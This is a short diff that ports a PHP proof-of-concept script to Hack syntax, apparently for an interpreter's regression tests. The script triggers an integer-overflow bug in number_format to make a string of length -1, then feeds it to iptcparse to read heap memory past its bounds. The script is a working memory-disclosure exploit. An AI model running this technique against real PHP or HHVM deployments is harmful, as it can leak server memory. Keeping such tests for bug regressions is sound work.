@@ -1,5 +1,6 @@
-<?php
-  $READ_LENGTH = 0x1000; // choose leak size
+<?hh
+<<__EntryPoint>> function main(): void {
+$READ_LENGTH = 0x1000; // choose leak size
 // construct fake iptc header for controlled read
 $iptc_hdr =
   "\x1c\x01" . // magic
@@ -11,9 +12,9 @@ $holder = [];
 for($i = 0; $i < 100; $i++)
   $holder[] = str_pad($iptc_hdr, 96);
 // trigger bug to create string with len=-1
-$badstr = number_format(0,0x7fffffff);
+$badstr = number_format(0.0,0x7fffffff);
 var_dump($badstr);
 // leak memory :)
 $tmp = iptcparse($badstr);
 var_dump($tmp);
-?>
+}
